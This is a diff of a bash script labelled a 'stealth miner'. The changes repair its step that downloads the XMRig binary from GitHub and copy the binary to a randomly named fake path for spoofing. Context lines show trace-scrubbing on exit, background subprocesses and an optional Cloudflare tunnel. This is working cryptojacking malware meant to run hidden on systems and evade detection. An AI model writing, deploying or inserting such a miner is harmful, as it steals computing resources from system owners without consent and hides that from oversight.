@@ -1,7 +1,7 @@
 #!/bin/bash
 # ================================================================
-#  SELF‑CONTAINED STEALTH MINER – NO COMPILATION, NO SUDO
-#  (Downloads pre‑built XMRig, random spoofs, no fake output)
+#  SELF‑CONTAINED STEALTH MINER – FIXED DOWNLOAD & CP ERRORS
+#  (No sudo, no compilation, all random spoofs)
 # ================================================================
 set -e
 
@@ -63,55 +63,60 @@ _scrub() {
 }
 trap '_scrub ; exit' EXIT
 
-# ---- Helper: download XMRig binary if missing ----
+# ---- Download XMRig static binary ----
 _download_xmrig() {
-    # Check if we already have a binary in a known location
+    # Remove any directory named xmrig
+    [ -d "./xmrig" ] && rm -rf "./xmrig"
+    # Check if we already have a binary file
     if [ -f "./xmrig" ] && [ -x "./xmrig" ]; then
-        echo "✅ Found existing xmrig binary in current directory."
+        echo "✅ Found existing xmrig binary."
         return 0
     fi
 
-    # Detect architecture
     ARCH=$(uname -m)
     case "$ARCH" in
         x86_64)  XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz" ;;
         aarch64) XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-arm64.tar.gz" ;;
-        *) echo "⚠️ Unsupported architecture: $ARCH. Cannot download pre-built binary."; return 1 ;;
+        *) echo "⚠️ Unsupported architecture: $ARCH"; return 1 ;;
     esac
 
-    # Choose download tool
     if command -v curl &>/dev/null; then
         DL_CMD="curl -L"
     elif command -v wget &>/dev/null; then
         DL_CMD="wget -O-"
     else
-        echo "⚠️ Neither curl nor wget found. Cannot download XMRig."
+        echo "⚠️ No curl/wget found."
         return 1
     fi
 
     echo "📥 Downloading static XMRig for $ARCH..."
-    $DL_CMD "$XMRIG_URL" | tar -xz -C /tmp
-    # The tarball extracts to a folder like xmrig-6.21.0/
-    EXTRACTED_DIR=$(find /tmp -maxdepth 1 -type d -name "xmrig-*" | head -1)
-    if [ -z "$EXTRACTED_DIR" ]; then
-        echo "❌ Failed to extract binary."
+    # Download and extract to a temp directory
+    TMP_DIR=$(mktemp -d)
+    $DL_CMD "$XMRIG_URL" | tar -xz -C "$TMP_DIR" 2>/dev/null
+    # Find the binary inside the extracted folder
+    BIN_FILE=$(find "$TMP_DIR" -name "xmrig" -type f | head -1)
+    if [ -z "$BIN_FILE" ]; then
+        echo "❌ Binary not found in archive."
+        rm -rf "$TMP_DIR"
         return 1
     fi
-    cp "$EXTRACTED_DIR/xmrig" ./
+    # Copy to current directory as ./xmrig
+    cp "$BIN_FILE" ./xmrig
     chmod +x ./xmrig
-    rm -rf "$EXTRACTED_DIR"
+    rm -rf "$TMP_DIR"
     echo "✅ XMRig binary ready."
+    return 0
 }
 
-# ---- Download/compile XMRig ----
+# ---- Obtain binary ----
 _download_xmrig || {
-    echo "❌ Could not obtain XMRig binary. Exiting."
+    echo "❌ Could not obtain XMRig. Exiting."
     exit 1
 }
 
 # ---- Use the binary ----
-_BIN="./xmrig"   # now in current directory
-cp "$_BIN" "$_FAKE_BIN" 2>/dev/null || true   # copy to /tmp for spoofing
+_BIN="./xmrig"
+cp "$_BIN" "$_FAKE_BIN"   # copy to random fake path
 chmod +x "$_FAKE_BIN"
 
 # ---- Generate config ----
@@ -143,7 +148,7 @@ _ARR=($(echo "$_BANWORDS" | tr ' ' '\n'))
     exit 0
 ) &
 
-# ---- Optional: Cloudflare Tunnel (if tools exist) ----
+# ---- Optional Cloudflare Tunnel ----
 if command -v cloudflared &>/dev/null && command -v python3 &>/dev/null; then
     _STATUS_DIR="/tmp/status-$(_RAND_STR)"
     mkdir -p "$_STATUS_DIR"
